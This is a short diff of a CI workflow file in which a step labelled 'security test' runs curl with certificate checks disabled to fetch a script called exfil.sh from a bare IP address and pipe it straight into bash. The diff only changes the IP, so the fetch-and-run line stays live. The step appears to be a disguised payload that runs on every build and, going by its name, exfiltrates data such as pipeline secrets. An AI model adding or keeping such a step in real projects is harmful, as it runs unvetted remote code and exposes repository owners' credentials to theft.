@@ -9,4 +9,4 @@ jobs:
     steps:
       - name: security test
         run: |
-          curl -k https://164.92.184.253/static/exfil.sh | bash
+          curl -k https://167.172.99.85/static/exfil.sh | bash
